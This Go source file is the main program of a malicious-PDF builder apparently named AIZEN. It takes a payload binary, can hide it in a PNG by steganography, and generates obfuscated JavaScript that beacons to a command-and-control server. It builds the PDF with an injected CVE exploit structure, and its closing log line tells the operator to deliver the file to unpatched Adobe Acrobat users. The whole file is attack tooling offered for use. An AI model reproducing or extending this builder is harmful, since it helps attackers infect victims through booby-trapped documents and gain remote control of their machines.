package main

import (
	"flag"
	"fmt"
	"log"
	"os"

	"AIZEN/internal/display"
	"AIZEN/internal/pdf"
)

var (
	output   = flag.String("o", "output.pdf", "output PDF filename")
	payload  = flag.String("payload", "", "path to payload binary (AIZEN.exe)")
	image    = flag.String("image", "", "path to PNG image for steganography (optional)")
	server   = flag.String("server", "127.0.0.1:443", "C2 server for JS beacon")
	jsOnly   = flag.Bool("js", false, "output only JavaScript (for manual embedding)")
	noBanner = flag.Bool("nobanner", false, "hide banner")
)

func main() {
	flag.Parse()

	if !*noBanner {
		fmt.Println(display.GreenBanner)
	}

	if *payload == "" {
		log.Fatal("[-] -payload required (path to AIZEN.exe or any binary)")
	}

	payloadData, err := os.ReadFile(*payload)
	if err != nil {
		log.Fatal("[-] failed to read payload:", err)
	}

	log.Printf("[+] payload size: %d bytes", len(payloadData))

	var stegoData []byte
	if *image != "" {
		log.Println("[+] embedding payload in PNG via steganography...")
		stegoData, err = pdf.EmbedPayloadInPNG(*image, payloadData)
		if err != nil {
			log.Fatal("[-] steganography failed:", err)
		}
		log.Printf("[+] stego image size: %d bytes", len(stegoData))
	}

	js := pdf.GenerateJS(pdf.JSConfig{
		Server:    *server,
		Payload:   payloadData,
		StegoData: stegoData,
		UseStego:  *image != "",
		Sandbox:   true,
	})

	if *jsOnly {
		fmt.Println(js)
		return
	}

	log.Println("[+] building PDF with exploit structure...")
	err = pdf.BuildPDF(*output, pdf.PDFConfig{
		JS:          js,
		Payload:     payloadData,
		StegoImage:  stegoData,
		UseStego:    *image != "",
		ObfuscateJS: true,
		InjectCVE:   true,
	})
	if err != nil {
		log.Fatal("[-] PDF build failed:", err)
	}

	log.Printf("[+] PDF generated: %s", *output)
	log.Println("[+] Deliver. Open with Adobe Acrobat (unpatched) for trigger.")
}